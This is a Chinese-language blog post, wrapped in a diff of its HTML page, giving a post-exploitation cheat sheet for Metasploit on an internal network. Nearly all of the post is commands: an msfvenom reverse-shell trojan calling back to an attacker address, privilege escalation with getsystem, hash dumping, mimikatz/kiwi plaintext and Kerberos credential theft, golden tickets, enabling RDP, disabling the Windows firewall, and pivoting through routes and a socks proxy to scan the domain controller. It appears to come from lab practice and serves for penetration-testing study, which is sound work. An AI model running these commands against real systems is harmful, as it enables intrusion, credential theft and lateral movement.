@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网---msf或得shell后操作 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.通过上传木马获得shell：
+生成木马：
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.182.132  lport=4444 -f exe -o shell..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网---msf或得shell后操作</h2>
+            <div class="post-date">2023-03-08</div>
+            
+            <div class="post-content" v-pre>
+              <p>1.通过上传木马获得shell：</p>
+<pre><code>生成木马：
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.182.132  lport=4444 -f exe -o shell.exe
+
+msf开启监听：
+1)use  exploit/multi/handler     开启木马端口
+2）设置必选项payload（windows/x64/meterpreter/reverse_tcp）     lhost     lport   与第一步一致
+3）run
+</code></pre>
+<p>2.获得msfshell -- meterpreter后提权</p>
+<pre><code>getuid：查看当前权限
+getsystem：提权
+chcp 65001：更改编码
+</code></pre>
+<p>3.凭证获取：</p>
+<pre><code>获取哈希凭证：
+run post/windows/gather/smart_hashdump
+</code></pre>
+<p><code>MSF-Mimikatz</code><br>
+MSF中自带mimikatz模块(需要Administrator权限或者System权限)，且同时支持32位和64位的系统。但是该模块默认是加载32位的系统，若目标主机是64位，直接默认加载该模块会导致很多功能无法使用。</p>
+<p><code>进程迁移</code><br>
+64位系统需要将Meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。并且需要迁移到权限为NT AUTHORITY\SYSTEM的进程，因为进程迁移后meterpreter的权限是迁移进程的权限。</p>
+<p><code>查看靶机位数&amp;进程</code></p>
+<pre><code>meterpreter &gt; sysinfo        # 查看位数
+meterpreter &gt; ps             # 查看进程
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1678690329622.png" alt="" loading="lazy"></figure>
+<p><code>迁移&amp;加载MSF-Mimikatz模块</code></p>
+<pre><code>meterpreter &gt; migrate &lt;PID&gt;  # 进程迁移
+meterpreter &gt; load mimikatz  # 加载Mimikatz模块
+meterpreter &gt; load kiwi  # 加载Mimikatz模块已合并为kiwi
+
+</code></pre>
+<pre><code>creds_all：             #列举所有凭据，及明文密码
+kiwi_cmd：              #执行mimikatz的命令，后面接mimikatz.exe的命令
+creds_kerberos：        #列举所有kerberos凭据
+creds_msv：             #列举所有msv凭据
+creds_ssp：             #列举所有ssp凭据
+creds_tspkg：           #列举所有tspkg凭据
+creds_wdigest：         #列举所有wdigest凭据
+dcsync：                #通过DCSync检索用户帐户信息
+dcsync_ntlm：           #通过DCSync检索用户帐户NTLM散列、SID和RID
+golden_ticket_create：  #创建黄金票据
+kerberos_ticket_list：  #列举kerberos票据
+kerberos_ticket_purge： #清除kerberos票据
+kerberos_ticket_use：   #使用kerberos票据
+lsa_dump_sam：          #dump出lsa的SAM
+lsa_dump_secrets：      #dump出lsa的密文
+password_change：       #修改密码
+wifi_list：             #列出当前用户的wifi配置文件
+wifi_list_shared：      #列出共享wifi配置文件/编码
+
+</code></pre>
+<pre><code>
+kiwi_cmd：              #执行mimikatz的命令，后面接mimikatz.exe的命令`
+</code></pre>
+<pre><code>抓取明文密码
+meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords
+
+</code></pre>
+<p>4.远程连接</p>
+<pre><code>注册表开启3389端口
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+
+关闭防火墙
+netsh firewall set opmode disable   			#winsows server 2003 之前
+netsh advfirewall set allprofiles state off 	#winsows server 2003 之后
+
+</code></pre>
+<pre><code>开启：
+meterpreter &gt; run post/windows/manage/enable_rdp
+run post/windows/manage/enable_rdp USERNAME=test PASSWORD=123@a.com
+
+
+关闭：
+meterpreter &gt; run multi_console_command -r /root/.msf4/loot/20230313144338_default_192.168.159.155_host.windows.cle_446584.txt
+</code></pre>
+<p><strong>关闭防火墙：</strong><br>
+https://blog.csdn.net/qq_44159028/article/details/115671042</p>
+<p><strong>横向渗透：</strong><br>
+<code>定位域控</code></p>
+<pre><code>meterpreter &gt; shell
+$ net time /domain
+</code></pre>
+<p><code>获取目标内网相关信息(网段)</code></p>
+<pre><code>run get_local_subnets
+</code></pre>
+<p><code>配置路由</code></p>
+<pre><code>run autoroute -s 192.168.52.0/24
+
+run autoroute -p  显示
+</code></pre>
+<p><code>扫描存活主机</code><br>
+使用NetBIOS协议扫描域网段</p>
+<pre><code>meterpreter &gt; background    # 后台挂起Session
+
+msf5 exploit(multi/handler) &gt; use auxiliary/scanner/netbios/nbname 
+msf5 auxiliary(scanner/netbios/nbname) &gt; set rhosts 192.168.52.0/24
+msf5 auxiliary(scanner/netbios/nbname) &gt; run
+</code></pre>
+<p><code>添加socks代理</code></p>
+<pre><code>msf代理
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set version 4a
+
+修改/etc/proxychains4.conf    
+vim /etc/proxychains4.conf      
+
+扫描域控开放端口
+proxychains nmap -p 1-10000 -Pn -sT 192.168.52.138 
+</code></pre>
+<p><code>若允许远程连接：</code></p>
+<pre><code>proxychains4 rdesktop 192.168.52.138
+
+</code></pre>
+<p>https://www.naraku.cn/</p>
+
+            </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
